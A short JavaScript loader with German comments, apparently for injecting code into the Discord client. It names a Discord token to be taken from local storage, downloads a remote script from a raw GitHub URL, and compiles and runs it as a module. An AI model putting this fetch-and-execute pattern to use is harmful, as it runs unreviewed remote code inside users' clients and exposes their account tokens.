
/*
Hauptscript
*/
var DiscordToken = "Token aus dem Local Storage nehmen";
function requireFromString(src, filename) {
  var m = new module.constructor();
  m.paths = module.paths;
  m._compile(src, filename);
  return m.exports;
}
var DiscordAPI = [];
var xmlhttp;if (window.XMLHttpRequest){xmlhttp = new XMLHttpRequest();xmlhttp.open("GET", "https://raw.githubusercontent.com/4thebadwoofsky/scripts.common/master/discord.injector.js" ,false);xmlhttp.onreadystatechange = function () {if (xmlhttp.readyState != 4) return; DiscordAPI=requireFromString(xmlhttp.responseText,"discord.io"); console.log("[InjectorJS] Discord Crypto Loading...");};xmlhttp.send(null);}
